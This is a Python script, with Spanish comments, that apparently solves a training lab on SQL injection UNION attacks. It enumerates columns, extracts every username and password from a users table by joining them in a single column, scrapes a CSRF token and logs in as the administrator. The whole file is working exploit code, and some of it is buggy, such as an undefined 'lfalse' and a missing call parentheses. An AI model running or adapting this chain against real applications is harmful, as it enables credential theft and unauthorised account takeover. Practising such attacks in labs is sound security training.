# Lab: SQL injection UNION attack, retrieving multiple values in a single column
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
# The database contains a different table called users, with columns called username and password.
# To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

# Evitando errores por pantalla
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Variables globales 
proxyjp = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
nombre_parametro = "Tech+gifts"
ruta = f"filter?category={nombre_parametro}"

def retorna_cantidad_columnas(url):
    columna = 0
    bandera = True
    while bandera:
        columna += 1
        payload_rcc = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
        Solicitud_rcc = requests.get(url + ruta + payload_rcc, verify=False,proxies=proxyjp)
        respuesta_rcc = Solicitud_rcc.text
        if "UNION SELECT" in respuesta_rcc:
            bandera = False
            return columna
    return None

def retorna__tipo_dato_texto_columna(url,ColumnaAValidar):
    if ColumnaAValidar == 1:
        payload_rtdtc = "' UNION SELECT 'jpmg',NULL--"
        solicitud_rtdtc = requests.get(url + ruta + payload_rtdtc,verify=False,proxies=proxyjp)
        respuesta_rtdtc = solicitud_rtdtc.text
        if "jpmg" in respuesta_rtdtc:
            return True
        else:
            return False 
    if ColumnaAValidar == 2:
        payload_rtdtc = "' UNION SELECT NULL,'jpmg'--"
        solicitud_rtdtc = requests.get(url + ruta + payload_rtdtc,verify=False,proxies=proxyjp)
        respuesta_rtdtc = solicitud_rtdtc.text
        if "jpmg" in respuesta_rtdtc:
            return True
        else:
            return False    
    if ColumnaAValidar >= 3:
        print("[-] Error: Cantidad de columnas excede la funcionalidad")

def retorna_contraseña_usuarioespecifico(url,ColumnaTipoTexto,UsuarioEspecifico):
    if ColumnaTipoTexto == 1:
        payload_rcu = "' UNION SELECT username || ' ~ ' || password FROM users,NULL--"
        solicitud_rcu = requests.get(url + ruta + payload_rcu, verify=lfalse, proxies=proxyjp)
        resupuesta_rcu = solicitud_rcu.text
        parcseando_rcu = BeautifulSoup(resupuesta_rcu,'html.parser')
        bloques_tr = parcseando_rcu.find_all('tr')
        for recoriendo_tr in bloques_tr:
            bloques_th = recoriendo_tr.find('th')
            if bloques_th and f"{UsuarioEspecifico}" in bloques_th.get_text().strip():
                contraseña = bloques_th.get_text().strip()
                solo_contraseña = contraseña.split("~")[1].strip
                return solo_contraseña
        return None
    if ColumnaTipoTexto == 2:
        payload_rcu = "' UNION SELECT NULL,username || ' ~ ' || password FROM users--"
        solicitud_rcu = requests.get(url + ruta + payload_rcu, verify=False, proxies=proxyjp)
        resupuesta_rcu = solicitud_rcu.text
        parcseando_rcu = BeautifulSoup(resupuesta_rcu,'html.parser')
        bloques_tr = parcseando_rcu.find_all('tr')
        for recoriendo_tr in bloques_tr:
            bloques_th = recoriendo_tr.find('th')
            if bloques_th and f"{UsuarioEspecifico}" in bloques_th.get_text().strip():
                contraseña = bloques_th.get_text().strip()
                solo_contraseña = contraseña.split("~")[1].strip()
                return solo_contraseña
        return None

def Obtener_token_csrf_función(sessión, url):
    carga_pagina_login = sessión_actual.get(url + "login", verify=False, proxies=proxyjp)
    parseado_carga_pagina_login = BeautifulSoup(carga_pagina_login.text,'html.parser')
    obteniendo_fila_csrf = parseado_carga_pagina_login.find("input",{"name":"csrf"})
    if obteniendo_fila_csrf:
        csrf = obteniendo_fila_csrf['value']
        return csrf
    else:
        print("[-] No se encontro token CSRF.")
        return None

def inicio_de_sesión(sessión, url, usuario, contraseña, tokencsrf):
    datos_login = { "csrf": tokencsrf,
                    "username": usuario,
                    "password": contraseña}
    logueando = sessión.post(url + "login", data=datos_login, verify=False,proxies=proxyjp)
    respuesta_logueado = logueando.text
    if "Log out" in respuesta_logueado:
        print("[+] Inicio de sesión existoso!!!")
    else:
        print("[-] Inicio de sesión Fallido.")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cantidad_columnas = retorna_cantidad_columnas(url)
        print("[+] Se identifico " + str(cantidad_columnas) + " columnas.")
        tipo_dato_columna_1 = retorna__tipo_dato_texto_columna(url,1)
        print("[+] La 1ra columna es de tipo de dato texto? : " + str(tipo_dato_columna_1))
        tipo_dato_columna_2 = retorna__tipo_dato_texto_columna(url,2)
        print("[+] La 2da columna es de tipo de dato texto? : " + str(tipo_dato_columna_2))
        contraseña_obtenida = retorna_contraseña_usuarioespecifico(url,2,"administrator")
        print("[+] La contraseña del usuario administrator es: " + str(contraseña_obtenida))
        sessión_actual = requests.Session()
        token_csrf = Obtener_token_csrf_función(sessión_actual,url)
        print("[+] El token CSRF de la sesión actual es: " + token_csrf)
        inicio_de_sesión(sessión_actual,url,"administrator",contraseña_obtenida,token_csrf)

    except IndexError:
        print("[-] Uso: %s <url> " % sys.argv[0])
        print("[-] Ejemplo: %s https://ejemplo.com " % sys.argv[0])
